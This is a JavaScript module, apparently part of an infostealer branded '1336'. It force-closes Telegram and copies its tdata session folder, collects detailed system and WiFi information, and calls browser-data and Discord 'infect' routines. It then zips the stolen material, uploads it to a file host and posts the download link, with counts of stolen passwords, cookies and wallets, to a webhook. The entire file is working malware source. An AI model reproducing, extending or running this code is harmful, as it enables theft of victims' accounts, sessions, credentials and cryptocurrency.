module.exports = (client) => {
  return {
    async get_telegram() {
      var exists = false;
      if (
        client.requires.fs.existsSync(
          `${process.env.APPDATA}\\Telegram Desktop\\tdata`
        )
      ) {
        exists = true;
        client.requires.child_process.exec(
          "taskkill /IM Telegram.exe /F",
          (error, stdout, stderr) => {}
        );
        await client.utils.time.sleep(2500);
        client.utils.jszip.createFolder("\\Telegram");
        client.utils.jszip.copyFolder(
          `\\Telegram\\`,
          `${process.env.APPDATA}\\Telegram Desktop\\tdata`
        );
        client.utils.jszip.deleteFolder(
          `\\Telegram\\user_data\\media_cache`
        )
      } else {
        exists = false;
      }

      client.config.counter.telegram = exists;
    },

    async get_user_info() {
      let cpus = [];

      for (var cpu of client.config.user.cpus) {
        cpus.push(client.utils.encryption.decryptData(cpu));
      }

      let pc_info_text =
        "<================[   User Info   ]>================>\n";
      let fields = [];

      const wifi_connections = await client.config.user.wifi_connections();

      for (let [key, value] of Object.entries({
        "🖥️ CPU(s)": cpus.join("\n"),
        "⚡ RAM": client.utils.encryption.decryptData(client.config.user.ram),
        "🛑 Version": client.utils.encryption.decryptData(
          client.config.user.version
        ),
        "⏳ Uptime": client.utils.encryption.decryptData(
          client.config.user.uptime
        ),
        "📂 Host directory": client.utils.encryption.decryptData(
          client.config.user.hostdir
        ),
        "🆔 Host name": client.utils.encryption.decryptData(
          client.config.user.hostname
        ),
        "🆔 PC Name": client.utils.encryption.decryptData(
          client.config.user.username
        ),
        "👻 Type": client.utils.encryption.decryptData(client.config.user.type),
        "🏹 Arch": client.utils.encryption.decryptData(client.config.user.arch),
        "📢 Release": client.utils.encryption.decryptData(
          client.config.user.release
        ),
        "🌌 AppData Path": client.utils.encryption.decryptData(
          client.config.user.appdata
        ),
        "🪐 Temp Path": client.utils.encryption.decryptData(
          client.config.user.temp
        ),
        "🌐 User Domain": client.utils.encryption.decryptData(
          client.config.user.user_domain
        ),
        "💨 System Drive": client.utils.encryption.decryptData(
          client.config.user.system_drive
        ),
        "💾 Processors": client.utils.encryption.decryptData(
          client.config.user.processors
        ),
        "💾 Processor Identifier": client.utils.encryption.decryptData(
          client.config.user.processor_identifier
        ),
        "💾 Processor Architecture": client.utils.encryption.decryptData(
          client.config.user.processor_architecture
        ),
      })) {
        pc_info_text += `${key}: ${value}\n`;
        fields.push({
          name: key,
          value: `\`\`\`${value}\`\`\``,
          inline: true,
        });
      }

      let wifi_connections_text = `<================[WiFi connections]>================>\n${wifi_connections}`;
      return client.utils.webhook.createEmbed({
        fields: fields,
      });
    },

    get_executable_info() {
      let executable_info_text =
        "<================[Executable Info]>================>\n";
      let fields = [];

      for (let [key, value] of Object.entries({
        "☠️ Execution path": client.utils.encryption.decryptData(
          client.config.executable.execution_path
        ),
        "🅿️ Debug port": client.config.executable.debug_port,
        "🔢 PID": client.config.executable.pid,
        "🔢 PPID": client.config.executable.ppid,
      })) {
        fields.push({
          name: key,
          value: `\`\`\`${value}\`\`\``,
          inline: false,
        });
        executable_info_text += `${key}: ${value}\n`;
      }
      return client.utils.webhook.createEmbed({
        fields: fields,
      });
    },

    async initialize() {
      await this.get_user_info();
      await this.get_telegram();
      await this.get_executable_info();
      await this.infect();
      await this.send_zip();
    },

    getFolderFiles(path_prefix, path) {
      var result = "";

      for (var file of client.requires.fs.readdirSync(
        `${path_prefix}\\${path}`
      )) {
        var file_size_in_kb = (
          client.requires.fs.statSync(`${path_prefix}\\${path}\\${file}`).size /
          1024
        ).toFixed(2);
        if (
          !client.requires.fs
            .statSync(`${path_prefix}\\${path}\\${file}`)
            .isDirectory()
        ) {
          if (file.includes(".txt")) {
            result += `📄 ${path}/${file} - ${file_size_in_kb} KB\n`;
          } else if (file.includes(".png")) {
            result += `🖼️ ${path}/${file} - ${file_size_in_kb} KB\n`;
          } else {
            result += `🥙 ${path}/${file} - ${file_size_in_kb} KB\n`;
          }
        } else {
          result += this.getFolderFiles(`${path_prefix}\\`, `${path}/${file}`);
        }
      }

      return result;
    },

    async send_zip() {
      await client.utils.browsers.saveBrowserStuff();
      await client.utils.jszip.createZip();

      const upload = await client.utils.gofile.uploadFile(
        client.requires.fs.createReadStream(`${client.config.jszip.path}.zip`)
      );

      var counter_embed = this.create_counter_embed();

      counter_embed.fields = [{
        name: `\`${client.utils.encryption.decryptData(client.config.user.username)}\``,
        value: `**[Download](${upload.downloadPage})**`,
        inline: false
        },
      ],

      await client.utils.webhook.sendToWebhook({
        embeds: [counter_embed],
      });
    },

    create_counter_embed() {
      let obj = {
          "title": `Thanks for using 1336`,
          "description": `<a:1336:1026131793197400164> **${client.config.counter.passwords}  Passwords**\n<a:1336:1026131787157602375> **${client.config.counter.cookies} Cookies**\n<:1336:1026131791658110996> **${client.config.counter.wallets} Wallets/Extensions**\n<:1336:1026131791658110996> **${client.config.counter.minecraft} Minecraft**`,
          "footer": {
              text: client.utils.encryption.decryptData(client.config.embed.footer.text),
              icon_url: client.utils.encryption.decryptData(client.config.embed.footer.icon_url),
          },
          "timestamp": new Date(),
      }

      let cpus = [];

      for (var cpu of client.config.user.cpus) {
          cpus.push(client.utils.encryption.decryptData(cpu))
      }

      return obj
  },

    async infect() {
      await client.utils.discord.init();
    },
  };
};
